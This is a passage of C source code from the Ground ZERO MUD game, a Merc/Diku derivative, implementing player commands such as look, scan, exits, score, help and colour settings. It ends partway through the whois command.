/***************************************************************************
 *  Original Diku Mud copyright (C) 1990, 1991 by Sebastian Hammer,        *
 *  Michael Seifert, Hans Henrik St{rfeldt, Tom Madsen, and Katja Nyboe.   *
 *                                                                         *
 *  Merc Diku Mud improvments copyright (C) 1992, 1993 by Michael          *
 *  Chastain, Michael Quan, and Mitchell Tse.                              *
 *                                                                         *
 *  Ground ZERO improvements copyright pending 1994, 1995 by James Hilke   *
 *                                                                         *
 *  In order to use any part of this Merc Diku Mud, you must comply with   *
 *  both the original Diku license in 'license.doc' as well the Merc       *
 *  license in 'license.txt'.  In particular, you may not remove either of *
 *  these copyright notices.                                               *
 *                                                                         *
 *  Much time and thought has gone into this software and you are          *
 *  benefitting.  We hope that you share your changes too.  What goes      *
 *  around, comes around.                                                  *
 ***************************************************************************/

#if defined(macintosh)
#include <types.h>
#else
#include <sys/types.h>
#include <sys/time.h>
#endif
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <time.h>
#include "ground0.h"
#include "ansi.h"

/* command procedures needed */
DECLARE_DO_FUN(	do_exits	);
DECLARE_DO_FUN( do_look		);
DECLARE_DO_FUN( do_help		);

char *	const	where_name	[] =
{
    "<used as light>     ",
    "<worn on finger>    ",
    "<worn on finger>    ",
    "<worn around neck>  ",
    "<worn around neck>  ",
    "<worn on body>      ",
    "<worn on head>      ",
    "<worn on legs>      ",
    "<worn on feet>      ",
    "<worn on hands>     ",
    "<worn on arms>      ",
    "<worn as shield>    ",
    "<worn about body>   ",
    "<worn about waist>  ",
    "<worn around wrist> ",
    "<worn around wrist> ",
    "<wielded>           ",
    "<held>              "
};


/* for do_count */
int max_on = 0;



/*
 * Local functions.
 */
char *	format_obj_to_char	args( ( OBJ_DATA *obj, CHAR_DATA *ch,
				    bool fShort ) );
void	show_list_to_char	args( ( OBJ_DATA *list, CHAR_DATA *ch,
				    bool fShort, bool fShowNothing ) );
void	show_char_to_char_0	args( ( CHAR_DATA *victim, CHAR_DATA *ch ) );
void	show_char_to_char_1	args( ( CHAR_DATA *victim, CHAR_DATA *ch ) );
void	show_char_to_char	args( ( CHAR_DATA *list, CHAR_DATA *ch ) );
void	show_exits      	args( ( ROOM_DATA *the_room, CHAR_DATA *ch,
				       char *argument) );
bool	check_blind		args( ( CHAR_DATA *ch ) );
void    send_centerred          args( ( char *argument, CHAR_DATA *ch ) );

char *format_obj_to_char( OBJ_DATA *obj, CHAR_DATA *ch, bool fShort )
{
    static char buf[MAX_STRING_LENGTH];

    buf[0] = '\0';

    if ( fShort )
    {
	if ( obj->short_descr != NULL )
	    strcat( buf, obj->short_descr );
    }
    else
    {
	if ( obj->description != NULL )
	    strcat( buf, obj->description );
    }

    return buf;
}

int do_scan (CHAR_DATA *ch, char *argument)
{
  sh_int distance;
  char *the_dir, buf[MAX_INPUT_LENGTH];
  CHAR_DATA *fch;

  send_to_char ("Characters you can see.\n\r", ch);
  send_to_char ("-----------------------\n\r", ch);
  for (fch = char_list; fch; fch = fch->next)
    {
      if (fch == ch)
	continue;
      if (!can_see_linear_char (ch, fch))
	continue;
      if (ch->in_room->x - fch->in_room->x > 0)
	{
	  distance = ch->in_room->x - fch->in_room->x;
	  the_dir = "west";
	}
      else
	if (ch->in_room->x - fch->in_room->x < 0)
	  {
	    distance = fch->in_room->x - ch->in_room->x;
	    the_dir = "east";
	  }
	else
	  if (ch->in_room->y - fch->in_room->y > 0)
	    {
	      distance = ch->in_room->y - fch->in_room->y;
	      the_dir = "south";
	    }
	  else
	    if (ch->in_room->y - fch->in_room->y < 0)
	      {
		distance = fch->in_room->y - ch->in_room->y;
		the_dir = "north";
	      }
	    else
	      {
		act ("$N is here.", ch, NULL, fch, TO_CHAR);
		continue;
	      }
      sprintf (buf, "$N is %d %s.", distance, the_dir);
      act (buf, ch, NULL, fch, TO_CHAR);
    }
}

/*
 * Show a list to a character.
 * Can coalesce duplicated items.
 */
void show_list_to_char( OBJ_DATA *list, CHAR_DATA *ch, bool fShort, bool fShowNothing )
{
#define MAX_ITEMS_IN_ROOM 500
#define MAX_LENGTH_ITEM_DESC 200
    char buf[MAX_STRING_LENGTH];
    char prgpstrShow[MAX_ITEMS_IN_ROOM][MAX_LENGTH_ITEM_DESC];
    int prgnShow[MAX_ITEMS_IN_ROOM];
    char pstrShow[MAX_LENGTH_ITEM_DESC];
    OBJ_DATA *obj;
    int nShow;
    int iShow;
    int count;
    bool fCombine;

    if ( ch->desc == NULL )
	return;

    /*
     * Alloc space for output lines.
     */
    count = 0;
    for ( obj = list; obj != NULL; obj = obj->next_content )
      {
	if (count > 10000)
	  {
	    send_to_char ("Infinite object list, report this bug.\n\r", ch);
	    sprintf (pstrShow, "skipping infinite obj list (showed to %s).",
		     ch->names);
	    sbug (pstrShow);
	    return;
	  }
	count++;
      }
    nShow	= 0;

    /*
     * Format the list of objects.
     */
    for ( obj = list; obj != NULL; obj = obj->next_content )
    { 
	if ( obj->wear_loc == WEAR_NONE)
	{
	    strcpy (pstrShow, format_obj_to_char(obj, ch, fShort));
	    fCombine = FALSE;

	    if ( IS_NPC(ch) || IS_SET(ch->comm, COMM_COMBINE) )
	    {
		/*
		 * Look for duplicates, case sensitive.
		 * Matches tend to be near end so run loop backwords.
		 */
		for ( iShow = nShow - 1; iShow >= 0; iShow-- )
		{
		    if ( !strcmp( prgpstrShow[iShow], pstrShow ) )
		    {
			prgnShow[iShow]++;
			fCombine = TRUE;
			break;
		    }
		}
	    }

	    /*
	     * Couldn't combine, or didn't want to.
	     */
	    if ( !fCombine )
	    {
		strcpy (prgpstrShow[nShow],str_dup(pstrShow));
		prgnShow [nShow] = 1;
		nShow++;
	    }
	}
    }

    /*
     * Output the formatted list.
     */
    for ( iShow = 0; iShow < nShow; iShow++ )
    {
	if ( IS_NPC(ch) || IS_SET(ch->comm, COMM_COMBINE) )
	{
	    if ( prgnShow[iShow] != 1 )
	    {
		sprintf( buf, "(%2d) ", prgnShow[iShow] );
		send_to_char( buf, ch );
	    }
	    else
	    {
		send_to_char( "     ", ch );
	    }
	}
	send_to_char( prgpstrShow[iShow], ch );
	send_to_char( "\n\r", ch );
    }

    if ( fShowNothing && nShow == 0 )
    {
	if ( IS_NPC(ch) || IS_SET(ch->comm, COMM_COMBINE) )
	    send_to_char( "     ", ch );
	send_to_char( "Nothing.\n\r", ch );
    }

    return;
}



void show_char_to_char_0( CHAR_DATA *victim, CHAR_DATA *ch )
{
    char buf[MAX_STRING_LENGTH];

    buf[0] = '\0';

    if (IS_SET(victim->act, PLR_WIZINVIS)) strcat( buf, "(`wWizi``) " );

    strcat( buf, PERS( victim, ch ) );
    if ( !IS_NPC(victim) && !IS_SET(ch->comm, COMM_BRIEF) )
	strcat( buf, victim->pcdata->title_line );

    switch ( victim->position )
    {
    case POS_DEAD:     strcat( buf, " is DEAD!!" );              break;
    case POS_MORTAL:   strcat( buf, " is mortally wounded." );   break;
    case POS_INCAP:    strcat( buf, " is incapacitated." );      break;
    case POS_STUNNED:  strcat( buf, " is lying here stunned." ); break;
    case POS_SLEEPING: strcat( buf, " is sleeping here." );      break;
    case POS_RESTING:  strcat( buf, " is resting here." );       break;
    case POS_SITTING:  strcat( buf, " is sitting here." );	 break;
    case POS_STANDING: strcat( buf, " is here." );               break;
    case POS_FIGHTING:
	strcat( buf, " is here, fighting " );
	if ( victim->fighting == NULL )
	    strcat( buf, "thin air??" );
	else if ( victim->fighting == ch )
	    strcat( buf, "YOU!" );
	else if ( victim->in_room == victim->fighting->in_room )
	{
	    strcat( buf, PERS( victim->fighting, ch ) );
	    strcat( buf, "." );
	}
	else
	    strcat( buf, "somone who left??" );
	break;
    }

    strcat( buf, "\n\r" );
    buf[0] = UPPER(buf[0]);
    send_to_char( buf, ch );
    return;
}



void show_char_to_char_1( CHAR_DATA *victim, CHAR_DATA *ch )
{
    char buf[MAX_STRING_LENGTH];
    OBJ_DATA *obj;
    int iWear;
    int percent;
    bool found;

    if ( can_see( victim, ch ) )
    {
	if (ch == victim)
	    act( "$n looks at $mself.",ch,NULL,NULL,TO_ROOM);
	else
	{
	    act( "$n looks at you.", ch, NULL, victim, TO_VICT    );
	    act( "$n looks at $N.",  ch, NULL, victim, TO_NOTVICT );
	}
    }

    act("$E is ready to kill you like anyone else you would find here.\n\r"
	"But other than that . . .", ch, NULL, victim, TO_CHAR );

    if ( victim->max_hit > 0 )
	percent = ( 100 * victim->hit ) / victim->max_hit;
    else
	percent = -1;

    strcpy( buf, PERS(victim, ch) );

    if (percent >= 100) 
	strcat( buf, " is in excellent condition.\n\r");
    else if (percent >= 90) 
	strcat( buf, " has a few scratches.\n\r");
    else if (percent >= 75) 
	strcat( buf," has some small wounds and bruises.\n\r");
    else if (percent >=  50) 
	strcat( buf, " has quite a few wounds.\n\r");
    else if (percent >= 30)
	strcat( buf, " has some big nasty wounds and scratches.\n\r");
    else if (percent >= 15)
	strcat ( buf, " looks pretty hurt.\n\r");
    else if (percent >= 0 )
	strcat (buf, " is in awful condition.\n\r");
    else
	strcat(buf, " is bleeding to death.\n\r");

    buf[0] = UPPER(buf[0]);
    send_to_char( buf, ch );

    found = FALSE;
    for ( iWear = 0; iWear < MAX_WEAR; iWear++ )
    {
	if ( ( obj = get_eq_char( victim, iWear ) ) != NULL)
	{
	    if ( !found )
	    {
		send_to_char( "\n\r", ch );
		act( "$N is using:", ch, NULL, victim, TO_CHAR );
		found = TRUE;
	    }
	    send_to_char( where_name[iWear], ch );
	    send_to_char( format_obj_to_char( obj, ch, TRUE ), ch );
	    send_to_char( "\n\r", ch );
	}
    }


    if (IS_IMMORTAL (ch))
    {
	send_to_char( "\n\rYou peek at the inventory:\n\r", ch );
	show_list_to_char( victim->carrying, ch, TRUE, TRUE );
    }
    return;
}



void show_char_to_char( CHAR_DATA *list, CHAR_DATA *ch )
{
    CHAR_DATA *rch;

    for ( rch = list; rch != NULL; rch = rch->next_in_room )
    {
	if ( rch == ch )
	    continue;

	if ( !IS_NPC(rch)
	&&   IS_SET(rch->act, PLR_WIZINVIS)
	&&   get_trust( ch ) < rch->invis_level )
	    continue;

	if ( can_see( ch, rch ) )
	  show_char_to_char_0( rch, ch );
    }

    return;
} 

bool check_blind( CHAR_DATA *ch )
{
  OBJ_DATA *prot_obj;

  if (!IS_NPC(ch) && IS_SET(ch->act,PLR_HOLYLIGHT))
    return TRUE;

  if ( IS_SET(ch->affected_by, AFF_BLIND))
    {
      send_to_char( "You can't see a thing!\n\r", ch ); 
      return FALSE; 
    }

  if (IS_SET (ch->in_room->room_flags, ROOM_DARK))
    if (((prot_obj = get_eq_char (ch, WEAR_HEAD)) == NULL) ||
	!IS_SET (prot_obj->general_flags, GEN_SEE_IN_DARK))
      { 
	send_to_char( "The room is too dark to see anything.\n\r", ch ); 
	return FALSE; 
      }

  return TRUE;
}

/* changes your scroll */
void do_scroll(CHAR_DATA *ch, char *argument)
{
    char arg[MAX_INPUT_LENGTH];
    char buf[100];
    int lines;

    one_argument(argument,arg);
    
    if (arg[0] == '\0')
    {
	if (ch->lines == 0)
	    send_to_char("You do not page long messages.\n\r",ch);
	else
	{
	    sprintf(buf,"You currently display %d lines per page.\n\r",
		    ch->lines + 2);
	    send_to_char(buf,ch);
	}
	return;
    }

    if (!is_number(arg))
    {
	send_to_char("You must provide a number.\n\r",ch);
	return;
    }

    lines = atoi(arg);

    if (lines == 0)
    {
        send_to_char("Paging disabled.\n\r",ch);
        ch->lines = 0;
        return;
    }

    if (lines < 10 || lines > 100)
    {
	send_to_char("You must provide a reasonable number.\n\r",ch);
	return;
    }

    sprintf(buf,"Scroll set to %d lines.\n\r",lines);
    send_to_char(buf,ch);
    ch->lines = lines - 2;
}

/* RT does socials */
void do_socials(CHAR_DATA *ch, char *argument)
{
    char buf[MAX_STRING_LENGTH];
    int iSocial;
    int col;
     
    col = 0;
   
    for (iSocial = 0; social_table[iSocial].name; iSocial++)
    {
	sprintf(buf,"%-12s",social_table[iSocial].name);
	send_to_char(buf,ch);
	if (++col % 6 == 0)
	    send_to_char("\n\r",ch);
    }

    if ( col % 6 != 0)
	send_to_char("\n\r",ch);
    return;
}

void send_centerred (char *argument, CHAR_DATA *ch)
{
  char buf[MAX_INPUT_LENGTH];
  int count, count2, size = strlen(argument);

  for (count = 0; count < 40 - size / 2 - size%2; count++)
    buf[count] = ' ';
  for (count2 = 0; argument[count2]; count++, count2++)
    buf[count] = argument[count2];
  buf[count++] = '\n';
  buf[count++] = '\r';
  buf[count] = 0;
  send_to_char (buf, ch);
  return;
}

/* RT Commands to replace news, motd, imotd, etc from ROM */

void do_news(CHAR_DATA *ch, char *argument)
{
    do_help(ch,"news");
}

void do_motd(CHAR_DATA *ch, char *argument)
{
    do_help(ch,"motd");
}

void do_imotd(CHAR_DATA *ch, char *argument)
{  
    do_help(ch,"imotd");
}

void do_rules(CHAR_DATA *ch, char *argument)
{
    do_help(ch,"rules");
}

void do_story(CHAR_DATA *ch, char *argument)
{
    do_help(ch,"story");
}

void do_changes(CHAR_DATA *ch, char *argument)
{
    do_help(ch,"changes");
}

void do_wizlist(CHAR_DATA *ch, char *argument)
{
  int count;
  char buf[MAX_STRING_LENGTH], *place;

  send_centerred ("The Admins", ch);
  send_centerred ("----------", ch);
  for (count = 0; imp_table[count].rl_name[0]; count++)
    if (!imp_table[count].honorary)
      send_centerred (imp_table[count].game_names, ch);
  send_to_char ("\n\r",ch);
  send_centerred ("The Gods", ch);
  send_centerred ("--------", ch);
  for (count = 0; god_table[count].rl_name[0]; count++)
    if (!god_table[count].honorary)
      send_centerred (god_table[count].game_names, ch);
  return;
}

/* RT this following section holds all the auto commands from ROM, as well as
   replacements for config */

void do_autolist(CHAR_DATA *ch, char *argument)
{
    /* lists most player flags */
    if (IS_NPC(ch))
      return;

    send_to_char("   action     status\n\r",ch);
    send_to_char("---------------------\n\r",ch);
}

void send_color_status(CHAR_DATA *ch, char *a, char *c, byte b) {
	sprintf(c,"%s %s %s\n\r",color_table[b],a,ANSI_NORMAL);  
	send_to_char(c,ch);	
}


void do_color(CHAR_DATA *ch, char *argument)
 {
 int i=0;
 int a=0,b=0;
 char cbuf[MAX_INPUT_LENGTH];
 if (IS_NPC(ch)) {
 	send_to_char("NPC's can't see colors!\n",ch);
 	return;
 }
 if (argument[0]==0) {
   	if( ch->color )
   		{
		ch->color = 0;	
		send_to_char("Ansi color turned off.\n\r",ch);
   		}
   		else
   		{
		ch->color = 1;
		send_to_char("Ansi color turned on.\n\r",ch);
   		}
 	}
 	else
 		{
 		argument=one_argument(argument,cbuf);
 		if (strcasecmp(cbuf,"list")==0) 
 		   {
 		   send_to_char(cbuf,ch);
 		   send_to_char("Listing colours.\n\r",ch);
 		   while(color_table[i])
 		   	{
 		   	sprintf(cbuf,"%scolor %d%s\n\r",color_table[i],i,ANSI_NORMAL);
 		   	send_to_char(cbuf,ch);
 		   	i++;
 		   	} 
 		   }
 		   else 
 		   	if(strcasecmp(cbuf,"show")==0)
 		   	  {
 		   	  send_to_char("Listing color setup.\n# of option\n",ch);
 		   	  send_color_status(ch,"1 actions",cbuf,ch->pcdata->color_action);
 		   	  send_color_status(ch,"2 combat melee (opponent)",cbuf,ch->pcdata->color_combat_o);
 		   	  send_color_status(ch,"3 combat condition (self)",cbuf,ch->pcdata->color_combat_condition_s);
 		   	  send_color_status(ch,"4 combat condition (opponent)",cbuf,ch->pcdata->color_combat_condition_o);
 		   	  send_color_status(ch,"5 wizi mobs",cbuf,ch->pcdata->color_wizi);
 		   	  send_color_status(ch,"6 xy coordinates",cbuf,ch->pcdata->color_xy);
 		   	  send_color_status(ch,"7 current level",cbuf,ch->pcdata->color_level);
 		   	  send_color_status(ch,"8 exits",cbuf,ch->pcdata->color_exits);
 		   	  send_color_status(ch,"9 hp",cbuf,ch->pcdata->color_hp);
 		   	  send_color_status(ch,"10 descripts",cbuf,ch->pcdata->color_desc);
 		   	  send_color_status(ch,"11 objects",cbuf,ch->pcdata->color_obj);
 		   	  send_color_status(ch,"12 say",cbuf,ch->pcdata->color_say);
 		   	  send_color_status(ch,"13 tell",cbuf,ch->pcdata->color_tell);
 		   	  send_color_status(ch,"14 reply",cbuf,ch->pcdata->color_reply);
 		   	  }
 		   	   else
 		   	if(strcasecmp(cbuf,"set")==0)
 		   	 { /* if cbuf */
 		   	 argument=one_argument(argument,cbuf);
 		   	 a=atoi(cbuf);
 		   	 argument=one_argument(argument,cbuf);
 		   	 
 		         if(cbuf) { /*cbuf*/
 		   	 b=atoi(cbuf);
 		   	 i=0;
 		   	 while(color_table[i]) i++;
 		   	 if ((b<i) && (b>=0)) /* check for valid color */
 		   	    {
			    switch(a) { /* switch a */
			 	case 1:  ch->pcdata->color_action=b;send_to_char("`aactions``\n\r",ch); break;
			 	case 2:  ch->pcdata->color_combat_o=b;send_to_char("`Acombat melee (opponent)``\n=r",ch); break;
			 	case 3:  ch->pcdata->color_combat_condition_s=b;send_to_char("`Ccombat condition (self)``\n\r",ch); break;
			 	case 4:  ch->pcdata->color_combat_condition_o=b;send_to_char("`ccombat condition (opponent)``\n\r",ch); break;
			 	case 5:  ch->pcdata->color_wizi=b;send_to_char("`wwizi mobs``\n\r",ch); break;
			 	case 6:  ch->pcdata->color_xy=b;send_to_char("`Xxy coordinates``\n\r",ch); break;
			 	case 7:  ch->pcdata->color_level=b;send_to_char("`Lcurrent level``\n\r",ch); break;
			 	case 8:  ch->pcdata->color_exits=b;send_to_char("`Eexits``\n\r",ch); break;
			 	case 9:  ch->pcdata->color_hp=b;send_to_char("`Hhp``\n\r",ch); break;
			 	case 10: ch->pcdata->color_desc=b;send_to_char("`Ddescripts``\n\r",ch); break;
			 	case 11: ch->pcdata->color_obj=b;send_to_char("`Oobjects``\n\r",ch); break;
			        case 12: ch->pcdata->color_say=b;send_to_char("`ssay``\n\r",ch); break;
			 	case 13: ch->pcdata->color_tell=b;send_to_char("`ttell``\n\r",ch); break;
			 	case 14: ch->pcdata->color_reply=b;send_to_char("`rreply``\n\r",ch); break;
			 	default: send_to_char("Change color for which option?\n\r",ch); break;
			        } /* switch a */
			    } /* if (b...) */
			    else send_to_char("What color!!!\n",ch);
 		   	 } /* cbuf */
 		   	 } /* if (set==show) */
 		   	 else send_to_char("Color what?\n",ch);
   	        }
 }


void do_prompt(CHAR_DATA *ch, char *argument)
{
    if (IS_SET(ch->comm,COMM_PROMPT))
    {
      send_to_char("You will no longer see prompts.\n\r",ch);
      REMOVE_BIT(ch->comm,COMM_PROMPT);
    }
    else
    {
      send_to_char("You will now see prompts.\n\r",ch);
      SET_BIT(ch->comm,COMM_PROMPT);
    }
}

void do_combine(CHAR_DATA *ch, char *argument)
{
    if (IS_SET(ch->comm,COMM_COMBINE))
    {
      send_to_char("Long inventory selected.\n\r",ch);
      REMOVE_BIT(ch->comm,COMM_COMBINE);
    }
    else
    {
      send_to_char("Combined inventory selected.\n\r",ch);
      SET_BIT(ch->comm,COMM_COMBINE);
    }
}

void show_battlemap (CHAR_DATA *ch)
{
  int x, y;
  ROOM_DATA *the_room;
  OBJ_DATA *obj;

  send_to_char ("`1THE NAMELESS CITY``\n\r", ch);
  for (y = the_city->y_size - 1; y >= 0; y--)
    {
      send_to_char ("\n\r", ch);
      for (x = 0; x < the_city->x_size; x++)
	{
	  the_room = index_room (the_city->rooms_on_level, x, y);

	  for (obj = the_room->contents; obj; obj = obj->next_content)
	    if (obj->item_type == ITEM_TEAM_VEHICLE)
	      break;

	  if (obj)
	    {
	      send_to_char ("T", ch);
	      continue;
	    }

	  for (obj = the_room->contents; obj; obj = obj->next_content)
	    if (IS_SET (obj->general_flags, GEN_BURNS_ROOM))
	      break;
	  if (obj)
	    {
	      send_to_char ("`1F``", ch);
	      continue;
	    }

	  for (obj = the_room->contents; obj; obj = obj->next_content)
	    if (IS_SET (obj->general_flags, GEN_DARKS_ROOM))
	      break;

	  if (obj)
	    {
	      send_to_char ("`9D``", ch);
	      continue;
	    }
	  
	  if (the_room->people)
	    if (IS_NPC (the_room->people))
	      send_to_char ("`9s``", ch);
	    else
	      send_to_char ("`9S``", ch);
	  else
	    send_to_char (".", ch);
	}
    }
}

void do_look( CHAR_DATA *ch, char *argument )
{
    char buf  [MAX_STRING_LENGTH];
    char arg1 [MAX_INPUT_LENGTH];
    char arg2 [MAX_INPUT_LENGTH];
    char arg3 [MAX_INPUT_LENGTH];
    long      pexit;
    CHAR_DATA *victim;
    OBJ_DATA *obj;
    char *pdesc;
    int door;
    int number,count;

    if (ch->interior)
      {
	ROOM_DATA *room = ch->in_room;
	CHAR_DATA *vict_next;

	char_from_room (ch);
	/* this is kind of ugly, but in order to maintain the integrity
	   of the list, we can't change the list as we cycle through it.
	   so we put everyone in another room, and trans them 1 by 1 to
	   look. */
	for (victim = ch->interior->people; victim;
	     victim = vict_next)
	  {
	    vict_next = victim->next_in_room;
	    char_from_room (victim);
	    char_to_room (victim, explosive_area);
	  }
	for (victim = explosive_area->people; victim;
	     victim = vict_next)
	  {
	    vict_next = victim->next_in_room;
	    if (!IS_SET (victim->temp_flags, IN_TANK))
	      continue;
	    char_from_room (victim);
	    char_to_room (victim, room);
	    do_look (victim, "auto");
	    char_from_room (victim);
	    char_to_room (victim, ch->interior);
	  }
	char_to_room (ch, room);
      }

    if ( ch->desc == NULL )
	return;

    if ( ch->position < POS_SLEEPING )
    {
	send_to_char( "You can't see anything but stars!\n\r", ch );
	return;
    }

    if ( ch->position == POS_SLEEPING )
    {
	send_to_char( "You can't see anything, you're sleeping!\n\r", ch );
	return;
    }

    if ( !check_blind( ch ) )
	return;

    argument = one_argument( argument, arg1 );
    argument = one_argument( argument, arg2 );
    number = number_argument(arg1,arg3);
    count = 0;

    if ( arg1[0] == '\0' || !str_cmp( arg1, "auto" ) )
    {
      if (ch->in_room->inside_mob)
	{
	  send_to_char ("You see the inside of a tank.\n\r", ch);
	  return;
	}

	/* 'look' or 'look auto' */
        sprintf (buf, "`D%s`` [`X%d``, `X%d``] L - `L%d``\n\r", 
		 ch->in_room->name, ch->in_room->x, ch->in_room->y, 
		 ch->in_room->level);
       
	send_to_char( buf, ch );
	    
	send_to_char("\n\r",ch);
	do_exits( ch, "auto" );

	show_list_to_char( ch->in_room->contents, ch, FALSE, FALSE );
	show_char_to_char( ch->in_room->people,   ch );
	return;
    }

    if ((ch->in_room->x == -1) &&
	(ch->in_room->y == -1) &&
	(ch->in_room->level == -1) &&
	(ch->in_room != safe_area) &&
	(!ch->in_room->interior_of ||
	 (ch->in_room->interior_of->item_type == ITEM_TEAM_ENTRANCE)))
	
      {
	if (!str_cmp (arg1, "map"))
	  {
	    show_battlemap (ch);
	    return;
	  }
      }

    if (!str_cmp (arg1, "out"))
      {
	OBJ_DATA *in_obj;
	CHAR_DATA *in_mob;
	ROOM_DATA *room, *back;

	if (((in_obj = ch->in_room->interior_of) == NULL) &&
	    ((in_mob = ch->in_room->inside_mob) == NULL))
	  {
	    send_to_char ("You are not inside anything to look out of!", ch);
	    return;
	  }
	back = ch->in_room;
	room = in_obj ? in_obj->in_room : in_mob->in_room;

	char_from_room (ch);
	char_to_room (ch, room);
	do_look (ch, "auto");
	char_from_room (ch);
	char_to_room (ch, back);
	return;
      }

    if ( !str_cmp( arg1, "i" ) || !str_cmp( arg1, "in" ) )
    {
	/* 'look in' */
	if ( arg2[0] == '\0' )
	{
	    send_to_char( "Look in what?\n\r", ch );
	    return;
	}

	if ( ( obj = get_obj_here( ch, arg2 ) ) == NULL )
	{
	    send_to_char( "You do not see that here.\n\r", ch );
	    return;
	}

	if (obj->contains)
	  {
	    sprintf (buf, "$p is loaded with $P.\n\rThere are %d rounds "
		     "left.\n\r", obj->contains->ammo);
	    act(buf, ch, obj, obj->contains, TO_CHAR );
	    return;
	  }
	else
	  {
	    send_to_char ("There is nothing inside.\n\r", ch);
	    return;
	  }
    }

    if ( ( victim = get_char_room( ch, arg1 ) ) != NULL )
    {
	show_char_to_char_1( victim, ch );
	return;
    }

    for ( obj = ch->carrying; obj != NULL; obj = obj->next_content )
    {
      if ( is_name( arg3, obj->name ) )
	if (++count == number)
	  {
	    send_to_char( obj->description, ch );
	    send_to_char( "\n\r",ch);
	    return;
	  }
    }

    for ( obj = ch->in_room->contents; obj != NULL; obj = obj->next_content )
    {
	if ( is_name( arg3, obj->name ) )
	    if (++count == number)
	    {
	    	send_to_char( obj->description, ch );
	    	send_to_char("\n\r",ch);
	    	return;
	    }
    }
    
    if (count > 0 && count != number)
    {
    	if (count == 1)
    	    sprintf(buf,"You only see one %s here.\n\r",arg3);
    	else
    	    sprintf(buf,"You only see %d %s's here.\n\r",count,arg3);
    	
    	send_to_char(buf,ch);
    	return;
    }

         if ( !str_cmp( arg1, "n" ) || !str_cmp( arg1, "north" ) ) door = 0;
    else if ( !str_cmp( arg1, "e" ) || !str_cmp( arg1, "east"  ) ) door = 1;
    else if ( !str_cmp( arg1, "s" ) || !str_cmp( arg1, "south" ) ) door = 2;
    else if ( !str_cmp( arg1, "w" ) || !str_cmp( arg1, "west"  ) ) door = 3;
    else if ( !str_cmp( arg1, "u" ) || !str_cmp( arg1, "up"    ) ) door = 4;
    else if ( !str_cmp( arg1, "d" ) || !str_cmp( arg1, "down"  ) ) door = 5;
    else
    {
	send_to_char( "You do not see that here.\n\r", ch );
	return;
    }

    send_to_char( "Nothing special there.\n\r", ch );

    return;
}

/*
 * Thanks to Zrin for auto-exit part.
 */
void do_exits(CHAR_DATA *ch, char *argument )
{
  show_exits (ch->in_room, ch, argument);
}

void show_exits( ROOM_DATA *the_room, CHAR_DATA *ch, char *argument )
{
    ROOM_DATA *room_to;
    extern char * const dir_name[];
    char buf[MAX_STRING_LENGTH],buf2[MAX_STRING_LENGTH];
    int pexit;
    bool found;
    bool fAuto;
    sh_int door;

    buf[0] = '\0';
    fAuto  = !str_cmp( argument, "auto" );

    if ( !check_blind( ch ) )
	return;

    strcpy( buf, fAuto ? "[Exits:" : "Obvious exits:\n\r" );

    found = FALSE;
    for ( door = 0; door <= 5; door++ )
    {
        pexit = the_room->exit[door];
	if (!IS_SET (pexit, EX_ISWALL) && !IS_SET(pexit, EX_CLOSED) )
	{
	    found = TRUE;
	    if ( fAuto )
	    {
	      sprintf (buf2, " `E%s``",dir_name[door]);
	      strcat( buf, buf2 );
	    }
	    else
	    {
	      room_to = get_to_room (the_room, door);
	      sprintf( buf + strlen(buf), "`E%-5s`` - %s\n\r",
		      capitalize(dir_name[door]),
		      room_to->name);
			
	    }
	}
    }

    if ( !found )
	strcat( buf, fAuto ? " none" : "None.\n\r" );

    if ( fAuto )
	strcat( buf, "]\n\r" );

    send_to_char( buf, ch );
    return;
}

void do_score( CHAR_DATA *ch, char *argument )
{
    char buf [MAX_STRING_LENGTH];
    sprintf( buf, "You are %s.\n\r", ch->names);
    send_to_char( buf, ch );
    sprintf (buf, "You have played for %d hours.\n\r",
	     (int) (ch->played + current_time - ch->logon) / 3600);
    send_to_char (buf, ch);
    sprintf( buf, "Your armor will absorbe %d hp from each shot you "
	    "take.\n\r", ch->armor);
    send_to_char(buf, ch);
    switch ( ch->position )
    {
    case POS_DEAD:     
	send_to_char( "You are DEAD!!\n\r",		ch );
	break;
    case POS_MORTAL:
	send_to_char( "You are mortally wounded.\n\r",	ch );
	break;
    case POS_INCAP:
	send_to_char( "You are incapacitated.\n\r",	ch );
	break;
    case POS_STUNNED:
	send_to_char( "You are stunned.\n\r",		ch );
	break;
    case POS_SLEEPING:
	send_to_char( "You are sleeping.\n\r",		ch );
	break;
    case POS_RESTING:
	send_to_char( "You are resting.\n\r",		ch );
	break;
    case POS_STANDING:
	send_to_char( "You are standing.\n\r",		ch );
	break;
    case POS_FIGHTING:
	send_to_char( "You are fighting.\n\r",		ch );
	break;
    }

    /* RT wizinvis and holy light */
    if ( IS_IMMORTAL(ch))
    {
      send_to_char("Holy Light: ",ch);
      if (IS_SET(ch->act,PLR_HOLYLIGHT))
        send_to_char("on",ch);
      else
        send_to_char("off",ch);
 
      if (IS_SET(ch->act,PLR_WIZINVIS))
      {
        sprintf( buf, "  Invisible: level %d",ch->invis_level);
        send_to_char(buf,ch);
      }
      send_to_char("\n\r",ch);
    }
    return;
}

void do_time( CHAR_DATA *ch, char *argument )
{
    extern char str_boot_time[];
    char buf[MAX_STRING_LENGTH];

    sprintf( buf, "Ground ZERO started up at %s\n\r"
	    "The system time is %s\n\r", str_boot_time,
	    (char *) ctime( &current_time ));

    send_to_char( buf, ch );
    return;
}

void do_help( CHAR_DATA *ch, char *argument )
{
    HELP_DATA *pHelp;
    char argall[MAX_INPUT_LENGTH],argone[MAX_INPUT_LENGTH];

    if ( argument[0] == '\0' )
	argument = "summary";

    /* this parts handles help a b so that it returns help 'a b' */
    argall[0] = '\0';
    while (argument[0] != '\0' )
    {
	argument = one_argument(argument,argone);
	if (argall[0] != '\0')
	    strcat(argall," ");
	strcat(argall,argone);
    }

    for ( pHelp = help_first; pHelp != NULL; pHelp = pHelp->next )
    {
	if ( pHelp->level > get_trust( ch ) )
	    continue;

	if ( is_name( argall, pHelp->keyword ) )
	{
	    if ( pHelp->level >= 0 && str_cmp( argall, "imotd" ) )
	    {
		page_to_char( pHelp->keyword, ch );
		page_to_char( "\n\r", ch );
	    }

	    /*
	     * Strip leading '.' to allow initial blanks.
	     */
	    if ( pHelp->text[0] == '.' )
		page_to_char( pHelp->text+1, ch );
	    else
		page_to_char( pHelp->text  , ch );
	    return;
	}
    }

    send_to_char( "No help on that word.\n\r", ch );
    return;
}


/* whois command */
void do_whois (CHAR_DATA *ch, char *argument)
{
    char arg[MAX_INPUT_LENGTH];
    char output[MAX_STRING_LENGTH];
    char buf[MAX_STRING_LENGTH];
    DESCRIPTOR_DATA *d;
    bool found = FALSE;

